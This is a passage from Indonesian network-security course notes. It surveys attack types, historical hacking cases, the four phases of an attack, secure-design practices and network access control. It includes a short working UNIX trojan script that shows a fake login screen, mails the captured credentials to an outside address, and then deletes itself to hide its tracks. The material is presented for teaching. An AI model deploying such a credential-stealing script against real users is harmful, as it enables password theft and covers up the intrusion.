- **DOS**: Serangan terhadap sebuah komputer atau server di dalam jaringan internet dengan cara menghabiskan sumber (resource) yang dimiliki oleh komputer tersebut sampai komputer tersebut tidak dapat menjalankan fungsinya dengan benar.
- **DDOS**: Jenis serangan Denial of Service (DOS) yang menggunakan banyak host (baik itu menggunakan komputer yang didedikasikan untuk melakukan penyerangan atau komputer yang "dipaksa" menjadi zombie) untuk menyerang satu buah host target dalam sebuah jaringan.

**Mekanisme DDOS Attack:**

![alt text](https://raw.githubusercontent.com/Agressiv1njector/TangselSecTeam/refs/heads/main/images/2.2%20network%20security.png)

```
                       ┌──────────────────────┐
                       │ Attacker / Botmaster │
                       └──────────┬───────────┘
                                  │
                         Issue Command: ATTACK
                                  │
                    ┌─────────────┼─────────────┐
                    │             │             │
            ┌───────▼────┐  ┌────▼──────┐  ┌──▼───────┐
            │   Bot 1    │  │   Bot 2   │  │  Bot N.. │
            │  Infected  │  │  Infected │  │ Infected │
            └───────┬────┘  └────┬──────┘  └──┬───────┘
                    │             │            │
                    │             │            │
         Thousands of ATTACK Packets Sent Simultaneously
                    │             │            │
                    └─────────────┼────────────┘
                                  │
                    ┌─────────────▼────────────┐
                    │   TARGET SERVER / WEB    │
                    │   Resources Exhausted    │
                    │   Cannot Handle Traffic  │
                    │   DOWN / NO RESPONSE     │
                    └──────────────────────────┘
```

### 2. Interception (Pengalihan)

Interception adalah serangan jenis ini ditujukan terhadap aspek privacy dan authentication. Pihak yang tidak berwenang dapat mengakses informasi. Contoh: serangan ini pencurian data pengguna kartu kredit.⁹

**Ilustrasi Interception Attack:**

![alt text](https://raw.githubusercontent.com/Agressiv1njector/TangselSecTeam/refs/heads/main/images/netsec2-3.png)

```
┌─────────────────────────────────────────────────────────────┐
│         INTERCEPTION ATTACK (Privacy Threat)                │
└─────────────────────────────────────────────────────────────┘

Normal Communication (Secure):
┌────────┐  Encrypted  ┌────────┐  Encrypted  ┌────────┐
│ Sender │────────────▶│ Channel│────────────▶│ Receiver
└────────┘   Data✓     └────────┘   Data✓     └────────┘
                          SAFE

Attack: Sniffing / Eavesdropping
┌────────┐             ┌────────┐             ┌────────┐
│ Sender │────────────▶│ Channel│────────────▶│Receiver│
└────────┘  Data       └───┬────┘   Data      └────────┘
                           │ INTERCEPT
                      ┌────▼─────┐
                      │  Attacker │
                      │ (SNIFFING)│
                      │ Copy Data │
                      └───────────┘
                         ✗ LEAKED
```

**Contoh penyerangannya:**
- **Wiretapping** (penyadapan): Suatu kejahatan yang berupa penyadapan saluran komunikasi khususnya jalur yang menggunakan kabel.
- **Sniffing**: Adalah penyadapan terhadap lalu lintas data pada suatu jaringan komputer.

**Skenario Sniffing:**
```
┌──────────────────────────────────────────────┐
│         Network Sniffing Scenario             │
└──────────────────────────────────────────────┘

Network Switch/Hub:
┌────┬────┬────┬────┐
│PC1 │PC2 │PC3 │PC4 │
└─┬──┴──┬─┴──┬─┴──┬─┘
  │     │    │    │
  └─────┼────┼────┘
        │    │
    ┌───▼────▼───┐
    │  ATTACKER  │
    │ (Promiscuous│
    │   Mode ON) │
    │ CAPTURE ALL│
    │   TRAFFIC  │
    └────────────┘
    
Attacker dapat melihat:
✗ Plaintext passwords
✗ Email contents
✗ Credit card numbers
✗ Personal data
```

### 3. Modification (Pengubahan)

Modification adalah serangan jenis ini ditujukan terhadap aspek privacy, authentication, dan integrity. Pihak yang tidak berwenang dapat mengakses dan mengubah informasi.

**Ilustrasi Modification Attack:**

![alt text](https://raw.githubusercontent.com/Agressiv1njector/TangselSecTeam/refs/heads/main/images/netsec-2-4.png)

```
┌─────────────────────────────────────────────────────────────┐
│        MODIFICATION ATTACK (Integrity Threat)               │
└─────────────────────────────────────────────────────────────┘

Original Message:
┌─────────────────────────┐
│ "Transfer $100 ke A"    │
│ Signed by: Sender       │
└─────────────────────────┘

Attack: Message Modification
┌─────────────────────┐
│ "Transfer $100 to A"│
│ ↓ (Intercept)       │
│ ATTACKER MODIFIES   │
│ ↓                   │
│"Transfer $1000 to B"│ ← Changed!
│ Signed by: Sender   │ ← Fake signature
└─────────────────────┘
       ✗ TAMPERED

Receiver gets modified message, thinks it's from original sender!
```

**Contoh penyerangannya:**
- Mengubah nilai-nilai file data, mengubah program sehingga bertindak secara berbeda, memodifikasi pesan-pesan yang ditransmisikan pada jaringan.⁹
- Mengubah pesan dari website dengan pesan yang merugikan pemilik website.⁸

**Man-in-the-Middle (MITM) Modification Attack:**
```
NORMAL:
Alice ◄──────────────────► Bob
      Transfer $100

MITM ATTACK:
Alice ────────┐
              │
         ┌────▼─────┐
         │ ATTACKER  │
         └────┬──────┘
              │
             Bob

Attacker:
1. Intercept message dari Alice
2. Modify: "$100" → "$1000"
3. Send modified ke Bob
4. Bob terima pesan termodifikasi, pikir dari Alice
```

### 4. Fabrication (Pemalsuan)

Fabrication adalah seseorang yang tidak memiliki hak akses, memasukkan suatu objek palsu ke dalam sistem yang ada. Serangan jenis ini ditujukan terhadap aspek privacy, authentication, dan integrity.

**Ilustrasi Fabrication Attack:**

![alt text](https://raw.githubusercontent.com/Agressiv1njector/TangselSecTeam/refs/heads/main/images/netsec-2-5.png)

```
┌─────────────────────────────────────────────────────────────┐
│         FABRICATION ATTACK (Authentication Threat)          │
└─────────────────────────────────────────────────────────────┘

Spoofing / Fake Authentication:
┌─────────────────────┐
│  Real Person: Bob   │
│  Real Email: bob@co │
└─────────────────────┘

┌──────────────────────────────────────────┐
│     ATTACKER IMPERSONATES BOB            │
│  Fake Email: bob@co (typo: rn→m)        │
│  Fake Server: Looks identical            │
│  Goal: Users think they're talking to Bob│
└──────────────────────────────────────────┘

Result:
✗ Victim login dengan fake server
✗ Credentials captured
✗ Money transfer to attacker
✗ Data stolen
```

**Contoh Penyerangannya:**
- **Phishing Mail**: Memasukkan pesan-pesan palsu seperti e-mail palsu ke dalam jaringan komputer.³

**Phishing Attack Flow:**
```
ATTACKER SENDS FAKE EMAIL:
┌────────────────────────────────┐
│ From: bank@mybank.com          │
│ Subject: Urgent! Verify Account│
│ Body: Click here to verify     │
│ Link: http://bank-fake.com/login
└────────────────────────────────┘
            ↓ (User clicks)
        ┌─────────────┐
        │ Fake Website│ ← Looks exactly like real bank
        │ LOGIN PAGE  │
        └──────┬──────┘
               ↓ (User enters credentials)
        ┌─────────────────────┐
        │ ATTACKER CAPTURES   │
        │ Username: john123   │
        │ Password: P@ssw0rd  │
        │ Now attacker can:   │
        │ - Access bank acc   │
        │ - Steal money       │
        │ - Commit fraud      │
        └─────────────────────┘
```

**Perbandingan 4 Jenis Attack Model Klasik:**
```
┌──────────────────┬──────────────┬────────────────┬─────────────┐
│ Attack Type      │ Target       │ Mechanism      │ Impact      │
├──────────────────┼──────────────┼────────────────┼─────────────┤
│ INTERRUPTION     │ Availability │ Delete/Destroy │ Data GONE   │
│ (DOS/DDOS)       │              │ Crash system   │ System DOWN │
├──────────────────┼──────────────┼────────────────┼─────────────┤
│ INTERCEPTION     │ Privacy      │ Sniff/Listen   │ Data LEAKED │
│ (Sniffing)       │ Confidential.│ Eavesdrop      │ Info stolen │
├──────────────────┼──────────────┼────────────────┼─────────────┤
│ MODIFICATION     │ Integrity    │ Change/Alter   │ Data WRONG  │
│ (MITM)           │              │ Tamper message │ Trust broken│
├──────────────────┼──────────────┼────────────────┼─────────────┤
│ FABRICATION      │ Authentication
│ (Spoofing)       │              │ Fake/Impersonate
│                  │              │ Forge identity │ Wrong party │
└──────────────────┴──────────────┴────────────────┴─────────────┘
```

---

### 5. Advanced Persistent Threat (APT)

**Pengertian APT**: Serangan yang terkoordinasi, sophisticated, dan bertahan lama yang dilakukan oleh group adversary canggih (biasanya state-sponsored atau organized crime) untuk mencuri data sensitif atau establish persistent access jangka panjang.

**Karakteristik APT:**
- Highly targeted dan planned secara detail
- Multiple attack vectors dan stages
- Attempts to maintain undetected presence
- Specific goals (data theft, espionage, sabotage)
- Advanced techniques dan tools

**Ilustrasi APT Attack Chain:**

```
┌─────────────────────────────────────────────────────────────┐
│              ADVANCED PERSISTENT THREAT (APT)               │
└─────────────────────────────────────────────────────────────┘

Months of Planning & Preparation
           ↓
   STAGE 1: RECONNAISSANCE (Weeks)
   • Target identification
   • Intelligence gathering
   • Personnel research
           ↓
   STAGE 2: WEAPONIZATION (Custom)
   • Develop custom malware
   • Create exploit code
   • Build delivery mechanisms
           ↓
   STAGE 3: DELIVERY (Targeted)
   • Spear-phishing emails
   • Zero-day exploits
   • Watering hole attacks
   • Supply chain compromise
           ↓
   STAGE 4: EXPLOITATION & INSTALLATION (Persistent)
   • Execute payload
   • Gain initial access
   • Install backdoors
   • Create multiple C&C channels
           ↓
   STAGE 5: COMMAND & CONTROL (Months/Years)
   • Maintain secure communication
   • Hide from detection
   • Expand network access
           ↓
   STAGE 6: ACTIONS ON OBJECTIVES (Long-term)
   • Data exfiltration (slowly)
   • System manipulation
   • Espionage or sabotage
   • Maintain access for future use
```

**Contoh APT:**
- Stuxnet (2010): APT terhadap Iranian nuclear facilities
- APT28 (Fancy Bear): Russian state-sponsored, target NATO & government
- APT29 (Cozy Bear): Russian SVR, sophisticated and stealthy
- Lazarus Group: North Korean state-sponsored, attacks banks dan infrastructure

---

### 6. Supply Chain Attack

**Pengertian Supply Chain Attack**: Serangan yang menargetkan kelemahan dalam supply chain atau dependencies software/hardware untuk kompromi multiple targets sekaligus melalui trusted vendor atau provider.

**Cara Kerja:**
```
┌─────────────────────────────────────────────────────────────┐
│            SUPPLY CHAIN ATTACK MECHANISM                    │
└─────────────────────────────────────────────────────────────┘

Normal Supply Chain:
┌──────────┐  Updates  ┌──────────┐  Distribute ┌────────────┐
│ Vendor   │──────────▶│ Software │────────────▶│  Customers │
│ Company  │           │ Repo     │             │ (Thousands)│
└──────────┘           └──────────┘             └────────────┘

Attack Chain:
         ┌─────────────────────────────────┐
         │  ATTACKER COMPROMISES VENDOR    │
         │  or Intercepts Update Mechanism │
         └─────────────────────────────────┘
                        │
                        ↓ (Inject malicious code)
         ┌─────────────────────────────────┐
         │   MALWARE in Official Update    │
         │   Digitally signed & trusted!   │
         └─────────────────────────────────┘
                        │
         All users trust vendor signature
                        │
         ┌──────────────┴──────────────────┐
         ↓                                  ↓
    Org A Infected                    Org B Infected
    Thousands of                      Thousands of
    customers                         customers

RESULT: Mass compromise through trusted source
```

**Contoh Supply Chain Attacks:**
- SolarWinds (2020): Compromised software updates, affected 18,000+ organizations
- CCleaner (2017): Malware in CCleaner updates
- XcodeGhost (2015): Compromised Xcode IDE, infected iOS apps
- NotPetya (2017): Compromised accounting software, caused $10B damage

---

### 7. Zero-Day Exploit

**Pengertian Zero-Day**: Exploit yang memanfaatkan vulnerability yang belum diketahui oleh vendor (unknown vulnerability). "Zero-day" berarti vendor memiliki zero days untuk patch.

**Karakteristik:**
- Vulnerability tidak diketahui publik
- Vendor tidak memiliki patch
- Attacker memiliki keuntungan maximum
- Sangat valuable di black market
- Sulit untuk defend

**Ilustrasi Zero-Day vs Known Vulnerability:**
```
KNOWN VULNERABILITY TIMELINE:
Vuln Discovered → Vendor Patched → Users Update → Safe
    Day 0           Day 3-7        Day 30-60    ✓ Protected

ZERO-DAY TIMELINE:
Vuln Unknown → Attacker Uses → Vendor Discovers → Patch
    Day 0      Day 0-???         Day 30-90    → Update
              ✗ VULNERABLE    (Could be months!)
```

**Contoh Zero-Days:**
- Microsoft Exchange ProxyLogon (CVE-2021-26855): 30,000+ organizations compromised
- Windows Print Spooler (CVE-2021-1732): Privilege escalation
- Apple iOS zero-days: Used by NSO Group Pegasus spyware

---

### 8. AI-Powered & Machine Learning Attacks

**Pengertian**: Serangan yang menggunakan AI/ML untuk automasi, optimization, dan social engineering yang lebih efektif. Era baru threat landscape.

**Jenis AI Attacks:**

**a) Adversarial Machine Learning**
- Attacker manipulates input data untuk bypass ML-based security
- Contoh: Evasion attacks terhadap malware detectors
- Poisoning attacks pada training data

**b) Deepfake & Synthetic Media Attacks**
```
Traditional Phishing:
"CEO wants wire transfer" ← Email text (easy to detect)

Deepfake Phishing:
CEO Video Call: "Transfer $500K immediately!" ← Deepfake
(Looks & sounds exactly like real CEO - very convincing!)
```
- Audio deepfakes untuk social engineering
- Video deepfakes untuk fraud
- Facial recognition bypass

**c) Automated Attack Optimization**
```
TRADITIONAL ATTACK:
Attacker manually tries techniques
                ↓
Takes months to compromise

AI-POWERED ATTACK:
├─ Automated vulnerability scanning
├─ ML predicts high-value targets
├─ Optimize attack paths
├─ Automate exploitation
├─ Rapid escalation
        ↓
Compromise dalam days/hours
```

**d) Credential Stuffing & Brute Force Optimization**
- AI predicts likely passwords based on patterns
- Optimize attack sequences
- Avoid detection patterns

**Contoh AI-Powered Attacks:**
- ChatGPT-powered phishing campaigns (generating personalized messages)
- ML models predicting security weaknesses
- Automated social engineering using AI

---

### 9. Cloud & API-Based Attacks

**Pengertian**: Serangan yang menargetkan cloud infrastructure, misconfigurations, dan API vulnerabilities di era cloud-native dan microservices.

**Jenis Cloud Attacks:**

**a) Misconfigured Cloud Storage**
```
Public S3 Bucket / Azure Blob / GCS Exposed
    ↓
Contains sensitive data:
├─ Customer databases
├─ Source code
├─ API keys & credentials
├─ Private documents
    ↓
Attacker access freely (S3 bucket disclosure)
```

**b) API Exploitation**
- Exposed API keys di source code repositories
- Broken authentication pada APIs
- Broken object level authorization
- Excessive data exposure dari APIs

**c) Container & Kubernetes Attacks**
- Compromised container images
- Kubernetes RBAC misconfigurations
- Escape from container sandbox
- Container registry poisoning

**Contoh:**
- Facebook S3 bucket leak: 533M phone numbers exposed
- Microsoft Azure Cosmos DB exposures: Multiple incidents
- Kubernetes default credentials left exposed

---

### 10. IoT & Embedded Systems Attacks

**Pengertian**: Serangan terhadap Internet of Things devices dan embedded systems yang seringkali memiliki security posture lemah.

**Karakteristik IoT Threats:**
- Default credentials never changed
- Outdated firmware tidak dapat di-patch
- Limited processing power untuk encryption
- Botnet recruitment untuk IoT devices

**Ilustrasi IoT Attack Chain:**
```
┌──────────────────────────────────────────┐
│    MASSIVE IoT BOTNET CREATION           │
└──────────────────────────────────────────┘

Millions of IoT Devices:
├─ Smart cameras
├─ Routers
├─ Printers
├─ Smart home devices
├─ Industrial sensors
└─ Other connected devices

                ↓ (All with default/weak credentials)

Attacker Scans & Compromises All
                ↓

Massive Botnet (millions of devices)
                ↓
Used for:
├─ DDOS attacks (300+ Gbps)
├─ Cryptocurrency mining
├─ Spreading malware
└─ Lateral attacks ke networks
```

**Contoh IoT Attacks:**
- Mirai Botnet (2016): 600,000+ IoT devices
- Dyn DDOS (2016): Mirai botnet attacks DNS provider, knocked out major websites
- VPNFilter: Sophisticated malware targeting routers, 500K+ devices

---

### 11. Cryptocurrency & Blockchain Attacks

**Pengertian**: Serangan yang menargetkan cryptocurrency wallets, exchanges, dan blockchain infrastructure.

**Jenis Attacks:**

**a) Wallet & Exchange Hacks**
- Private key theft
- Exchange compromise (Mt. Gox: $450M stolen)
- Smart contract exploits

**b) Mining Pool Attacks**
- 51% attacks (attacking blockchain consensus)
- Pool takeover

**c) Phishing Crypto Users**
- Fake wallet apps
- Malicious exchanges
- Private key theft

**Contoh:**
- Binance hack (2019): $40M stolen
- FTX collapse (2022): $32B loss through mismanagement/theft
- Cross-chain bridge hacks: Millions stolen

---

### 12. Side-Channel & Timing Attacks

**Pengertian**: Serangan yang menganalisis physical implementation (timing, power consumption, electromagnetic emissions) untuk extract secrets tanpa breaking cryptography.

**Jenis:**
- **Timing attacks**: Measure response time untuk deduce information
- **Power analysis**: Monitor power consumption patterns
- **Cache timing**: Exploit CPU cache behavior
- **Acoustic cryptanalysis**: Listen to sound dari processor

**Contoh:**
- Breaking AES encryption melalui cache timing
- Extracting cryptographic keys dari mobile phones menggunakan power consumption

---

**Ringkasan Model Attack Modern:**
```
┌────────────────────┬──────────────┬──────────────────────┐
│ Era / Type         │ Characteristi│ Modern Defense       │
├────────────────────┼──────────────┼──────────────────────┤
│ Stallings 4 Models │ Simple,      │ Firewall, Antivirus  │
│ (1995)             │ Well-known   │                      │
├────────────────────┼──────────────┼──────────────────────┤
│ APT (2000s-now)    │ Sophisticated│ EDR, SIEM, Threat    │
│                    │ Persistent   │ Intelligence         │
├────────────────────┼──────────────┼──────────────────────┤
│ Supply Chain       │ Mass impact  │ Software verification│
│ (2010s-now)        │ Trusted      │ Dependency scanning  │
├────────────────────┼──────────────┼──────────────────────┤
│ Zero-Day           │ Unknown      │ Patch management,    │
│ (1990s-now)        │ Maximum DMG  │ Zero-trust, Hardening│
├────────────────────┼──────────────┼──────────────────────┤
│ AI-Powered         │ Automated,   │ ML-based detection,  │
│ (2020s-now)        │ Adaptive     │ Behavioral analysis  │
├────────────────────┼──────────────┼──────────────────────┤
│ Cloud & API        │ Misconfigured│ Cloud WAF, CSPM,     │
│ (2015-now)         │ Exposed      │ API security         │
├────────────────────┼──────────────┼──────────────────────┤
│ IoT Attacks        │ Default creds│ Device hardening,    │
│ (2014-now)         │ Botnet army  │ Network segmentation │
└────────────────────┴──────────────┴──────────────────────┘
```

## 2.2 Beberapa Kasus Keamanan Komputer

Berikut ini beberapa kasus yang berhubungan dengan ancaman terhadap keamanan sistem informasi di Indonesia:

### a. Tahun 1995

Vladimir Levin membobol bank-bank di kawasan Wallstreet, mengambil uang sebesar $10 juta. Kevin Mitnick mencuri 20.000 nomor kartu kredit, menyalin sistem operasi DEC secara ilegal, dan mengambil alih hubungan telepon di New York dan California.

### b. Tahun 2000

**Contoh kasusnya:**
1. Fabian clone, menjebol situs aetna.co.id dan Jakarta mail dan membuat directory atas namanya berisi peringatan terhadap administrator situs tersebut. Situs yang diserang termasuk Bursa Efek Jakarta, BCA, Indosatnet, dan beberapa situs besar lain yang tidak dilaporkan.
2. September dan Oktober 2000, setelah membobol Bank Lippo, kembali Fabian Clone beraksi dengan menjebol web milik Bank Bali.¹⁰
3. Wenas, membuat server sebuah ISP di singapura down.

### c. Tahun 2001

Polda DIY meringkus seorang carder (pembobol kartu kredit). Tersangka diringkus di Bantul dengan barang bukti sebuah paket berisi lukisan berharga 30 juta rupiah.¹⁰

### d. Dikutip dari berita elektronik www.republika.co.id

Perubahan kartu tanda penduduk (KTP) menjadi bentuk elektronik (e-KTP), merupakan salah satu contoh sistem yang rentan dalam hal keamanannya, mengingat data yang ada di dalamnya merupakan data rahasia, data privasi yang perlu dilindungi. (keamanan Sistem Informasi Negara Terancam n.d.)

## 2.3 Memahami Hacker Bekerja

Secara umum Hacker bekerja melalui tahapan-tahapan sebagai berikut:

**Hacker Attack Phases:**
```
┌─────────────────────────────────────────────────────────┐
│         HACKER ATTACK PHASES (4 Tahapan)                │
└─────────────────────────────────────────────────────────┘

PHASE 1: RECONNAISSANCE
┌──────────────┐
│ 1. Mencari   │  ► Scan target system
│    tahu      │  ► Identify OS, services
│    sistem    │  ► Find vulnerabilities
│    komputer  │  ► Research potential entry points
│    yang      │  ► Gather employee info (social eng)
│    menjadi   │
│    sasaran   │
└──────────────┘
       ↓ (Information collected)

PHASE 2: PENYUSUPAN (Breaking In)
┌──────────────┐
│ 2. Penyusupan│  ► Exploit vulnerability
│              │  ► Brute force password
│    (Breaking │  ► Phishing email
│     In)      │  ► Default credentials
│              │  ► Physical access
└──────────────┘
       ↓ (Access gained!)

PHASE 3: PENJELAJAHAN (Exploration)
┌──────────────┐
│ 3. Penjelajah│  ► Explore system
│    an        │  ► Escalate privileges
│    (Explor-  │  ► Find valuable data
│     ation)   │  ► Map network
│              │  ► Setup backdoor
│              │  ► Install rootkit/malware
└──────────────┘
       ↓ (Maintain access, gather loot)

PHASE 4: KELUAR & HAPUS JEJAK (Cover Tracks)
┌──────────────┐
│ 4. Keluar &  │  ► Delete logs
│    Hapus     │  ► Erase evidence
│    Jejak     │  ► Remove malware artifacts
│              │  ► Cover data transfer tracks
│              │  ► Leave backdoor for future access
└──────────────┘
       ↓ (Hacker gone, but still has access!)
       
RESULT: Attacker maintains hidden access, hard to detect
```

1. Mencari tahu sistem komputer yang menjadi sasaran
2. Penyusupan
3. Penjelajahan
4. Keluar dan menghilangkan jejak

### Contoh Kasus: Trojan House (SHELL Script UNIX)

Peserta kuliah UNIX menggunakan program kecil `my_login` dalam bentuk shell script yang menyerupai layar login dan password sistem UNIX sebagai berikut:

```sh
#!/bin/sh
###################################
# Nama program : my_login
# Deskripsi : Program kuda trojan sederhana
# versi 1.0 November 1999
####################################
COUNTER=0
Cat /etc/issue
While [ "$COUNTER" –ne 2 ]
do
  let COUNTER=$COUNTER+1
  echo "login: \c"
  read LOGIN
  stty echo
  echo "password: \c"
  read PASSWORD
  echo "User $LOGIN : $PASSWORD" | mail gadis@company.com
  stty echo
  echo
  echo "Login Incorrect"
done
rm $0
kill –9 $PPID
```

Apabila program ini dijalankan maka akan ditampilkan layar login seperti layaknya awal penggunaan komputer pada sistem UNIX:

```
Login:
Password:
```

Layar login ini tidak terlihat beda dibanding layar login sesungguhnya, sistem komputer akan meminta pemakai untuk login ke dalam sistem. Setelah diisi password dan di enter, maka segera timbul pesan:

```
Login:root
Password: ********
Login Incorrect
```

Tentu saja Administrator UNIX akan kaget bahwa passwordnya ternyata (seolah-olah) salah. Untuk itu ia segera mengulangi login dan password. Setelah dua kali ia mencoba login dan tidak berhasil, maka loginnya dibatalkan dan kembali keluar UNIX.

Perhatikan program di atas baik-baik, sekali pemakai tersebut mencoba login dan mengisi password pada layar di atas, setelah itu maka otomatis data login dan password tersebut akan di email ke hacker@company.com. Sampai disini maka hacker telah mendapatkan login dan password.

Walaupun sederhana, jika kita perhatikan lebih jauh lagi, maka program ini juga memiliki beberapa trik hacker lainnya, yaitu proses penghilangan jejak (masih ingat tahapan hacker yang ditulis di atas?). Proses ini dilakukan pada 2 baris terakhir dari program `my_login` di atas:

```sh
rm $0
kill –9 $PPID
```

Yang artinya akan segera dilakukan proses penghapusan program `my_login` dan hapus pula ID dari proses. Dengan demikian hilanglah program tersebut yang tentunya juga menghilangkan barang bukti. Ditambah lagi penghapusan terhadap jejak proses di dalam sistem UNIX. Sukses dari program ini sebenarnya sangat tergantung dari bagaimana agar aplikasi ini dapat dieksekusi oleh root. Hacker yang baik memang harus berusaha memancing agar pemilik root menjalankan program ini.

## 2.4 Prinsip Dasar Perancangan Sistem Yang Aman

Adapun dasar-dasar dari perancangan sistem yang aman adalah:

- Mencegah hilangnya data
- Mencegah masuknya penyusup

---

#### **BEST PRACTICE RANCANGAN SISTEM YANG AMAN**

**Prinsip Fundamental (Saltzer & Schroeder):**

```
1. LEAST PRIVILEGE
   └─ User hanya dapat akses resource minimal yang diperlukan

2. DEFENSE IN DEPTH
   └─ Multiple layers of security (tidak tergantung satu layer)

3. FAIL SECURE
   └─ Jika sistem gagal, default adalah DENY (bukan ALLOW)

4. SEPARATION OF DUTIES
   └─ Task sensitive dipecah ke multiple persons

5. COMPLETE MEDIATION
   └─ Setiap akses HARUS melewati security check

6. OPEN DESIGN
   └─ Security bukan berdasarkan "secret" tapi design yang baik

7. PSYCHOLOGICAL ACCEPTABILITY
   └─ Security mechanism harus user-friendly
```

---

#### **CONTOH KASUS 1: USER ACCESS CONTROL**

**❌ PENERAPAN SALAH (Anti-Pattern):**
```
Skenario: Administrator di perusahaan

└─ Admin Account: admin (password: admin123)
   ├─ Permissions: FULL ACCESS ke SEMUA server
   ├─ Tidak ada password expiry
   ├─ Password ditulis di sticky note
   ├─ Login via unencrypted Telnet ← VERY DANGEROUS!
   └─ Tidak ada audit log

HASIL:
✗ Jika password bocor → attacker punya FULL ACCESS
✗ Tidak bisa trace siapa yang melakukan apa
✗ Password tidak berubah → compromised credential valid lama
✗ Cleartext communication → bisa di-sniff
```

**✅ PENERAPAN BENAR (Best Practice):**
```
Skenario: Implementasi least privilege

└─ User Account: john
   ├─ Permissions: HANYA akses file sendiri
   ├─ Password: Strong (12+ chars, mix case/number/symbol)
   ├─ Password Expiry: 90 hari (forced change)
   ├─ MFA Enabled: Google Authenticator (2FA)
   ├─ Sudo account: john_sudo (terpisah)
   │  ├─ Password: Berbeda dengan main account
   │  ├─ Permissions: ONLY specific commands (mysql restart, etc)
   │  ├─ Session timeout: 5 minutes
   │  └─ Audit: ALL commands logged
   └─ Login methods:
      ├─ SSH only (encrypted)
      ├─ SSH key-based (lebih aman dari password)
      ├─ VPN required untuk remote access
      └─ Audit log: SEMUA login tracked

HASIL:
✓ User terbatas akses → minimal damage jika compromised
✓ Admin account terpisah → john tidak punya admin privilege
✓ Sudo dengan specific commands → tidak full admin power
✓ Password expiry → old credential tidak bisa dipakai lama
✓ MFA → even jika password stolen, attacker masih blocked
✓ SSH key → lebih sulit di-crack dibanding password
✓ Audit log → bisa track siapa yang lakukan apa
```

---

#### **CONTOH KASUS 2: DATA BACKUP & RECOVERY**

**❌ PENERAPAN SALAH (Disaster):**
```
Skenario: Backup strategy di startup

└─ Backup Method:
   ├─ Manual backup kadang-kadang (tidak scheduled)
   ├─ Backup ke external HDD (disimpan di meja)
   ├─ Tidak ada encryption pada backup file
   ├─ Backup tested: TIDAK PERNAH ← CRITICAL!
   └─ Location: 1 physical location (di kantor)

RISIKO:
✗ Ransomware attack: "Sorry, no backup available"
✗ Backup HDD stolen: Data tidak ter-encrypt, total loss
✗ Backup never tested: Saat diperlukan CORRUPT (unusable)
✗ Fire/flood: Backup hilang bersamaan dengan production
```

**✅ PENERAPAN BENAR (3-2-1 Rule):**
```
Skenario: Enterprise backup strategy

└─ Backup Method:
   ├─ Automated daily backup (schedule: 2 AM UTC)
   ├─ Encryption: AES-256 on all backups
   ├─ Retention:
   │  ├─ Daily: Simpan 7 hari terakhir
   │  ├─ Weekly: Simpan 4 minggu terakhir
   │  └─ Monthly: Simpan 12 bulan terakhir
   ├─ 3-2-1 Rule:
   │  ├─ 3 copies: Production + 2 Backups
   │  ├─ 2 media: 1 disk (fast restore) + 1 tape (archive)
   │  └─ 1 offsite: Remote location atau cloud
   └─ Testing:
      ├─ Monthly: Test restore dari backup
      └─ Quarterly: Full disaster recovery drill

HASIL:
✓ Ransomware attack: Restore dari backup dalam 5 menit
✓ Tested regularly: Know backup benar-benar berfungsi
✓ Offsite: Fire tidak musnahkan semua copies
✓ Encryption: Backup theft tidak berarti data theft
✓ RPO < 24 jam, RTO < 4 hours
```

---

## 2.5 Lapisan Keamanan

Keamanan jaringan dibangun melalui beberapa lapisan pertahanan yang bekerja secara berlapis (defense in depth). Setiap lapisan memiliki peran penting untuk mencegah, mendeteksi, dan merespons ancaman keamanan. Berikut adalah lapisan-lapisan keamanan jaringan yang komprehensif:

### 2.5.0 Network Access Control (NAC)

**Network Access Control (NAC)** adalah mekanisme pertahanan lapisan pertama yang mengontrol device mana saja yang diizinkan untuk terhubung ke jaringan organisasi. NAC memastikan bahwa hanya device yang compliant dengan kebijakan keamanan yang dapat mengakses resources jaringan.

**Fungsi NAC:**
- **Device Detection & Inventory**: Mendeteksi dan mengidentifikasi semua devices yang mencoba terhubung ke jaringan
- **Posture Assessment**: Memeriksa apakah device memiliki security patches, antivirus, firewall yang updated
- **Policy Enforcement**: Memberlakukan kebijakan keamanan sebelum device mendapatkan akses penuh ke jaringan
- **Access Control**: Mengizinkan atau menolak koneksi device berdasarkan compliance status

#### **CONTOH PENERAPAN SALAH vs BENAR**

**❌ PENERAPAN SALAH (Open Network):**
```
Skenario: Perusahaan tanpa NAC

└─ Network Access:
   ├─ Open WiFi: Tidak ada password
   ├─ Device connection: Otomatis connect
   ├─ Posture check: TIDAK ADA
   ├─ Antivirus status: Tidak dicek
   ├─ OS patches: Tidak dicek
   ├─ Firewall enabled: Tidak dicek
   └─ Access: Semua devices dapat full access

RISIKO:
✗ Infected laptop masuk jaringan tanpa terdeteksi
✗ Malware dapat spread ke internal network
✗ Guest/attacker dapat connect ke WiFi
✗ IoT devices tanpa security connect freely
✗ BYOD devices dengan outdated OS masuk
```

**✅ PENERAPAN BENAR (NAC dengan Posture Check):**
```
Skenario: Implementasi Cisco ISE NAC

└─ Authentication Methods:
   ├─ Managed devices: 802.1X (certificate-based)
   ├─ Guest devices: Sponsored access (manual approval)
   ├─ BYOD: Mobile Device Management (MDM) integration
   └─ IoT devices: Device certificate atau shared secret

└─ Posture Compliance Check:
   ├─ OS patches: Windows updates REQUIRED
   ├─ Antivirus: McAfee/Symantec MUST be installed
   ├─ Firewall: Windows Defender Firewall MUST be ON
   ├─ Disk encryption: BitLocker MUST be enabled
   ├─ Password policy: Min 8 chars, expiry 90 days
   └─ Mobile: Screen lock REQUIRED, recent patches

└─ Access Tiers (based on compliance):
   ├─ TIER 1 - FULL COMPLIANT (Green):
   │  └─ Full network access + all resources
   │
   ├─ TIER 2 - NON-COMPLIANT (Yellow/Quarantine):
   │  ├─ Limited to remediation server
   │  ├─ Auto download patches, update antivirus
   │  └─ Retry NAC recheck every 1 hour
   │
   └─ TIER 3 - FAILED (Red/Blocked):
      ├─ BLOCKED from network
      └─ Manual approval needed

HASIL:
✓ Infected devices AUTOMATICALLY quarantined
✓ Non-compliant devices can't access sensitive data
✓ Remediation automated (patches auto-applied)
✓ Inventory of all devices dapat ditrack
```

**Implementasi NAC:**

```
┌─────────────────────────────────────────────────┐
│       NAC (Network Access Control) Process      │
└─────────────────────────────────────────────────┘

Device ingin connect ke jaringan:
    ↓
┌─────────────────────────────┐
│ NAC Portal / Authentication │
│ - Username/Password         │
│ - Certificate               │
│ - 802.1X (Port-based)       │
└────────────┬────────────────┘
             ↓
┌──────────────────────────────┐
│ Device Posture Check:        │
│ ✓ OS security patches        │
│ ✓ Antivirus updated          │
│ ✓ Firewall enabled           │
│ ✓ Disk encryption status     │
│ ✓ Password complexity        │
└────────────┬─────────────────┘
             ↓
     ┌───────────────┐
     │ Compliant?    │
